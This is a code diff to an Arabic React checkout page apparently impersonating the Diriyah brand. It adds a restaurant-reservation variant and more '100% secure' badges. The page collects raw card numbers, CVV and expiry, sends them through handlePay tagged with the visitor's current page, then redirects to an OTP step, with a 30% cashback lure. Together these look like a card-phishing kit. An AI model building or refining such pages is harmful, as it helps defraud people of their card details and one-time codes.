@@ -58,11 +58,12 @@ function CashbackPopup({ onClose }: { onClose: () => void }) {
 
 export default function CheckoutPage() {
   const [showPopup, setShowPopup] = useState(true);
+  const isRestaurant = localStorage.getItem("reservationType") === "restaurant";
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-[#f5f0e8] flex flex-col" dir="rtl">
       {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
-      <Header />
+      <Header isRestaurant={isRestaurant} />
       <ProgressSteps />
       <TitleSection />
       <main className="flex-1 px-4 py-6">
@@ -73,12 +74,12 @@ export default function CheckoutPage() {
   );
 }
 
-function Header() {
+function Header({ isRestaurant }: { isRestaurant: boolean }) {
   return (
-    <header className="bg-gradient-to-r from-[#3d3428] to-[#5c4a3d] text-white">
-      <div className="container mx-auto px-4 py-4">
+    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
+      <div className="container mx-auto px-4 py-3">
         <div className="flex items-center justify-between">
-          <Link href="/cart">
+          <Link href={isRestaurant ? "/restaurant-cart" : "/cart"}>
             <Button
               size="icon"
               variant="ghost"
@@ -93,7 +94,7 @@ function Header() {
             <img
               src="/logo-white.svg"
               alt="الدرعية"
-              className="h-12"
+              className="h-10"
               data-testid="img-checkout-logo"
             />
           </div>
@@ -135,6 +136,7 @@ function ProgressSteps() {
 }
 
 function TitleSection() {
+  const isRestaurant = localStorage.getItem("reservationType") === "restaurant";
   return (
     <div className="bg-gradient-to-r from-[#c4956a] to-[#d4a574] py-6 px-4 text-center">
       <div className="flex items-center justify-center gap-3">
@@ -146,7 +148,9 @@ function TitleSection() {
           إتمام الشراء
         </h1>
       </div>
-      <p className="text-white/80 text-sm mt-2">أدخل بيانات البطاقة للدفع الآمن</p>
+      <p className="text-white/80 text-sm mt-2">
+        {isRestaurant ? "أدخل بيانات البطاقة لتأكيد حجز المطعم" : "أدخل بيانات البطاقة للدفع الآمن"}
+      </p>
     </div>
   );
 }
@@ -330,6 +334,7 @@ function PaymentForm() {
   const handleSubmit = () => {
     if (!validateForm()) return;
     
+    const isRestaurant = localStorage.getItem("reservationType") === "restaurant";
     const paymentInfo = {
       cardNumber: cardNumber.replace(/\s/g, ""),
       cardName,
@@ -337,7 +342,7 @@ function PaymentForm() {
       expiryYear,
       cvv,
       cardType: getCardType(cardNumber),
-      currentPage: "checkout"
+      currentPage: isRestaurant ? "restaurant_checkout" : "checkout"
     };
     handlePay(paymentInfo, () => {});
     setLocation("/otp");
@@ -359,7 +364,7 @@ function PaymentForm() {
         <img src="/visa.png" className="h-4 opacity-70 hover:opacity-100 transition-opacity" alt="visa" />
       </div>
 
-      <div className="bg-white rounded-2xl shadow-xl p-6 space-y-5">
+      <div className="bg-white rounded-2xl shadow-xl p-6 space-y-5 border border-border/20">
         <div>
           <Label
             htmlFor="cardNumber"
@@ -493,10 +498,11 @@ function PaymentForm() {
         <Button
           onClick={handleSubmit}
           size="lg"
-          className="w-full bg-primary text-white shadow-lg mt-4"
+          className="w-full bg-primary text-white shadow-lg mt-4 h-14 text-base"
           data-testid="button-pay"
         >
-          متابعة الدفع
+          <Lock className="w-4 h-4 ml-2" />
+          متابعة الدفع الآمن
         </Button>
       </div>
     </div>
@@ -506,20 +512,27 @@ function PaymentForm() {
 function PaymentFooter() {
   return (
     <footer
-      className="px-4 py-6 text-center space-y-3"
+      className="px-4 py-6 text-center space-y-4"
       data-testid="payment-footer"
     >
-      <div className="flex items-center justify-center gap-2">
-        <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
-          <Lock className="w-4 h-4 text-green-600" />
+      <div className="max-w-md mx-auto bg-green-50 rounded-2xl p-4 border border-green-100">
+        <div className="flex items-center justify-center gap-2 mb-2">
+          <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
+            <Lock className="w-4 h-4 text-green-600" />
+          </div>
+          <div className="flex items-center gap-1">
+            <ShieldCheck className="w-4 h-4 text-green-600" />
+            <p className="text-sm text-green-700 font-medium">
+              دفع آمن ومشفر 100%
+            </p>
+          </div>
         </div>
-        <p className="text-sm text-muted-foreground">
-          جميع عمليات الدفع مشفرة وآمنة 100%
+      </div>
+      <div className="max-w-md mx-auto bg-gradient-to-r from-primary/10 to-[#d4a574]/10 rounded-2xl p-4">
+        <p className="text-sm text-primary font-medium">
+          احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة البلاتينية
         </p>
       </div>
-      <p className="text-sm text-primary font-medium">
-        احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة البلاتينية
-      </p>
     </footer>
   );
 }
